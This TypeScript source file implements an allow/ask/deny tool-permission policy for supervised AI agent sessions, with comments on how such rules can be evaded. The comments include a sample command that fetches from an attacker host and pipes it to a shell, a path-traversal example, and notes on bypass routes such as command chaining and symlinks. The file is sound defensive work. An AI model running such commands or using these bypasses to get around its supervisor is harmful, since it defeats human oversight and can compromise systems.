/**
 * The tool policy: which tool calls this session may make without asking,
 * which it must not make at all, and which go to the person supervising it.
 *
 * **This is a guard rail, not a sandbox; no-production is enforced by
 * environment.** A policy narrows what a cooperative teammate does without
 * asking. It does not confine a hostile one: a shell command can still reach
 * anything the process can reach, a path rule sees the string the model wrote
 * and not the symlink it may point at, and an over-long command is handed to a
 * person rather than analysed. What keeps a peer out of production is the
 * environment it runs in — the profile's credentials, `ANTHROPIC_BASE_URL`, the
 * sandbox the fleet starts it in — never this file.
 *
 * The shape is the contracts': `SessionSpec.toolPolicy`, `ToolPolicy`,
 * `ToolPolicyRule` and `defaultToolPolicy` live in `foundation/contracts` (§34).
 * This file re-exports them and holds only what the contract leaves to the
 * adapter — how a pattern is matched, and what is never matched at all.
 *
 * Evaluation is pure and ordered, so a policy can be read like the rule it is:
 * rules are tried in order and the first match wins; `tool` matches the tool
 * name exactly or as `*`; `pattern` is a RegExp source tested against the tool's
 * primary string; a rule with no pattern matches every call of its tool. No rule
 * matching means `defaultAction`. Absent policy means
 * `{defaultAction: 'ask', rules: []}` — the behaviour every session had before
 * policies existed, so adding the field changes nothing by omission.
 *
 * ## Allow rules vouch for one whole string; ask and deny rules search anywhere
 *
 * An `allow` rule is the only rule that grants something, so it is the only one
 * that can be fooled by hiding: `pattern` is compiled as `^(?:…)$` and must
 * cover the entire subject. `^echo ` does not allow `echo x; curl evil | sh`,
 * and does not allow `echo hi` either — an allowlist entry has to describe the
 * command it vouches for (`^echo .*$`). For `Bash` there is a second condition,
 * because `.*` is happy to walk across a pipe: a command carrying `;`, `&`,
 * `|`, a backtick, `$(`, a redirection (`<`, `>`) or a newline is never covered
 * by an allow rule, and falls through to the person who supervises it.
 *
 * `ask` and `deny` rules are the other direction: they are searches, compiled as
 * written and tested anywhere in the subject, so a deny entry still catches
 * `curl` inside `echo x; curl evil | sh`. Nothing is lost by leaving them
 * unanchored, and a deny that only matched whole strings would be trivially
 * stepped around.
 *
 * ## Nothing is truncated, and nothing enormous is examined
 *
 * A pattern sees the whole subject — the whole command, the whole path, the
 * whole input as JSON. Truncating would be a hole in the other direction: a
 * deny pattern is a search, and a subject cut short is a subject a deny rule
 * can be hidden past. Instead, a subject over 64 KB is not matched at all and
 * goes to the person supervising the session, whatever the policy says: past
 * that size nobody is reading it, and neither is the evaluator.
 *
 * `AskUserQuestion` is never evaluated: it is the peer asking its supervisor a
 * question, not a tool being permitted, and a policy that could deny it would
 * silently answer "no" to a question nobody read. It always takes the question
 * path, whatever the policy says.
 */

import { resolve } from 'node:path'

import { defaultToolPolicy, type ToolAction, type ToolPolicy, type ToolPolicyRule } from '@fleet/foundation-contracts'
import { fleetError } from '@fleet/foundation-core'

/**
 * The contract's policy types, under the names this package has always used.
 * The evaluator below is the adapter's half; the shape is not.
 */
export { defaultToolPolicy }
export type { ToolAction, ToolPolicy, ToolPolicyRule }

/** The tool the model asks a human with. Never allowed or denied by a policy. */
export const QUESTION_TOOL = 'AskUserQuestion'

/**
 * The longest subject that is examined at all. Past this no pattern is tested:
 * the call is handed to the person supervising the session, whatever the policy
 * says.
 */
export const MAX_SUBJECT_LENGTH = 64 * 1024

/**
 * What makes a command more than one command. An allow rule vouches for a
 * single command; anything that can carry, substitute or redirect to a second
 * one is not covered by it.
 */
const SHELL_CHAINING = /[;&|`<>]|\$\(|[\r\n]/

/** Where a session runs its tools; a relative path rule is resolved against it. */
export interface PolicyOptions {
  readonly cwd?: string
}

/** A rule with its pattern compiled once, so a bad regular expression fails at start, not mid-turn. */
export interface CompiledRule {
  readonly tool: string
  readonly match: RegExp | undefined
  readonly action: ToolAction
}

export interface CompiledToolPolicy {
  readonly defaultAction: ToolAction
  readonly rules: readonly CompiledRule[]
  /** The directory relative paths are resolved against — the session's own. */
  readonly cwd: string
}

/**
 * The string a `pattern` is tested against: what the tool would actually act on,
 * not the whole input object. A policy that has to match a file path should not
 * depend on JSON key order, and one that matches a shell command should see the
 * command.
 *
 * A file path is resolved and normalised first, so `../../etc/passwd` and
 * `/etc/passwd` are the same string to a rule and a relative rule matches what
 * the file tools will actually open. Symlinks are not followed: this is a guard
 * rail, not a sandbox (see the file comment).
 */
export const primaryString = (
  tool: string,
  input: Readonly<Record<string, unknown>>,
  cwd: string = process.cwd(),
): string => {
  if (tool === 'Bash') return typeof input.command === 'string' ? input.command : ''
  if (tool === 'Read' || tool === 'Write' || tool === 'Edit') {
    const path = input.file_path ?? input.path
    return typeof path === 'string' ? resolve(cwd, path) : ''
  }
  return stringify(input)
}

/** A policy that fails to compile is a configuration error, surfaced before the session starts. */
export const compilePolicy = (
  policy: ToolPolicy | undefined,
  options: PolicyOptions = {},
): CompiledToolPolicy => {
  const source = policy ?? defaultToolPolicy
  const rules = source.rules.map((rule): CompiledRule => {
    let match: RegExp | undefined
    if (rule.pattern !== undefined) {
      // An allow rule has to cover the whole subject; ask and deny rules search
      // wherever they match. See the file comment.
      const body = rule.action === 'allow' ? `^(?:${rule.pattern})$` : rule.pattern
      try {
        match = new RegExp(body)
      } catch (thrown) {
        throw fleetError('invalid_input', `tool policy rule for ${rule.tool} has an invalid pattern: ${rule.pattern}`, {
          cause: thrown,
          details: { tool: rule.tool, pattern: rule.pattern },
        })
      }
    }
    return Object.freeze({ tool: rule.tool, match, action: rule.action })
  })
  return Object.freeze({
    defaultAction: source.defaultAction,
    rules: Object.freeze(rules),
    cwd: options.cwd ?? process.cwd(),
  })
}

/**
 * The action for one tool call. Rules in order, first match wins; no match is
 * `defaultAction`. `AskUserQuestion` is always `ask` — see the file comment.
 */
export const evaluatePolicy = (
  policy: CompiledToolPolicy,
  tool: string,
  input: Readonly<Record<string, unknown>>,
): ToolAction => {
  if (tool === QUESTION_TOOL) return 'ask'
  const subject = primaryString(tool, input, policy.cwd)
  // Neither condition depends on the policy: an unexamined subject and one that
  // could carry a second command both go to the person supervising the session.
  if (subject.length > MAX_SUBJECT_LENGTH) return 'ask'
  const chains = tool === 'Bash' && SHELL_CHAINING.test(subject)
  for (const rule of policy.rules) {
    if (rule.tool !== '*' && rule.tool !== tool) continue
    if (rule.match !== undefined && !rule.match.test(subject)) continue
    // An allow rule vouches for one command, never for a command carrying a
    // second one — the pattern may not even be consulted before this check.
    if (rule.action === 'allow' && chains) continue
    return rule.action
  }
  return policy.defaultAction
}

/**
 * Every other tool is matched against its input as JSON, in full. Truncating
 * would be a hole the other way: a deny rule is a search, and a cut-short
 * subject is one a deny can be hidden past. Size is handled once, for every
 * tool alike, in `evaluatePolicy`.
 */
const stringify = (input: Readonly<Record<string, unknown>>): string => {
  try {
    return JSON.stringify(input) ?? ''
  } catch {
    // A circular or otherwise unserialisable input still has to be decided on;
    // an empty subject means a patterned rule does not match, which is the
    // conservative answer (`defaultAction`).
    return ''
  }
}
